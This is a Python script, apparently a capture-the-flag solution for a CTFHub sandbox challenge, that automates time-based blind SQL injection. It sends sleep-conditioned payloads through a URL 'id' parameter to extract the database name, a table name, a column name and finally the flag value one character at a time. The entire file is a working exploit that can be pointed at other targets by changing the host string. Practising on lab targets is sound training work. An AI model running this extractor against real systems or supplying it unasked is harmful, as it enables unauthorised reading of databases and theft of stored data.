from time import sleep
import requests

flag_index = ''
maxlength = 50
host = 'http://challenge-1e3e383a7178e7e0.sandbox.ctfhub.com:10800/?id='


# @description: 获取数据库长度
# @Author: Hengyi
# @Date: 2021/8/6
# @Return: int:length
def get_length():
    print('开始计算长度')
    payload = "if(length(database())>={0},sleep(3),1)"
    length = 0
    for t in range(15):
        try:
            url = host + payload.format(t + 1)
            r = requests.get(url, timeout=3)
        except Exception as e:
            length = t + 1
            print(f"当前长度：{length}")
            continue
        else:
            print('长度计算完成')
            return length


# @description: 获取数据库
# @Author: Hengyi
# @Date: 2021/8/6
# @Param: int:length
# @Return: str:database
def get_database(length):
    payload = "if(substr(database(),1,{0})='{1}',sleep(3),1)"
    database = ''
    for t in range(length):
        flag = False
        for i in range(ord('a'), ord('z') + 1):
            try:
                url = host + payload.format(t + 1, database + chr(i))
                r = requests.get(url, timeout=3)
            except Exception as e:
                database += chr(i)
                print(database)
                flag = True
                break
            else:
                pass
        if not flag:
            break
    print(f"最终的数据库为{database}")
    return database


# @description: 获取数据表
# @Author: Hengyi
# @Date: 2021/8/6
# @Param: str:database
# @Return: str:table
def get_table(database):
    payload = "if(substr((select table_name from information_schema.tables where table_schema='{0}' limit 1 offset 1),1,{1})='{2}',sleep(5),1)"
    table = ''
    for t in range(15):
        flag = False
        for i in range(ord('a'), ord('z') + 1):
            try:
                url = host + payload.format(database, (t + 1), table + chr(i))
                r = requests.get(url, timeout=5)
            except Exception as e:
                table += chr(i)
                print(table)
                flag = True
                break
            else:
                pass
        if not flag:
            break
    print(f"最终的表为{table}")
    return table


# @description: 获取列
# @Author: Hengyi
# @Date: 2021/8/6
# @Param: str:table
# @Return: str:columns
def get_columns(table):
    payload = "if(substr((select column_name from information_schema.columns where table_name='{0}' limit 1 offset 0),1,{1})='{2}',sleep(5),1)"
    columns = ''
    for t in range(15):
        flag = False
        for i in range(ord('a'), ord('z') + 1):
            try:
                url = host + payload.format(table, (t + 1), columns + chr(i))
                r = requests.get(url, timeout=5)
            except Exception as e:
                columns += chr(i)
                print(columns)
                flag = True
                break
            else:
                pass
        if not flag:
            break
    print(f"最终的表为{columns}")
    return columns


# @description: 拿到数据
# @Author: Hengyi
# @Date: 2021/8/6
# @Param: str:columns
# @Param: str:table
# @Return: str:info
def get_info(columns, table):
    list_info = '0123456789abcdefghijklmnopqrstuvwxyz{}'
    list_info = enumerate(list_info)
    payload = "if(substr((select {0} from {1}),1,{2})='{3}',sleep(5),1)"
    info = ''
    for t in range(40):
        flag = False
        for j, i in list_info:
            sleep(1)  # 减慢点频率,防止宕机了
            try:
                expand = payload.format(columns, table, t + 1, info + i)
                print(expand)
                url = host + payload.format(columns, table, (t + 1), (info + i))
                r = requests.get(url, timeout=5)
            except Exception as e:
                info += str(i)
                print(info)
                flag = True
                break
            else:
                pass
        if not flag:
            break
    print(f"最终的结果为{info}")
    return info


if __name__ == '__main__':
    '''
    因为靶机多半网络不是很好
    原理很简单,就是如果注入成功,那就sleep一会
    但是网络一旦不好,就特别容易出错
    建议一步步来
    '''
    length = get_length()
    # length = 4
    print('**请以长度和字符串长度相匹配来判断此正确**')
    print('**因为对方主机不稳定同样会造成很多延迟判断**')
    database = get_database(length)
    # database = 'sqli'
    table = get_table(database)
    # table = 'flag'
    columns = get_columns(table)
    # columns = 'flag'
    flag = get_info(columns, table)
